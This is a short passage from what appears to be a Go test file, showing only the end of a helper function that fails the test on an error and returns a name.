		t.Fatal(err)
	}
	return name
}
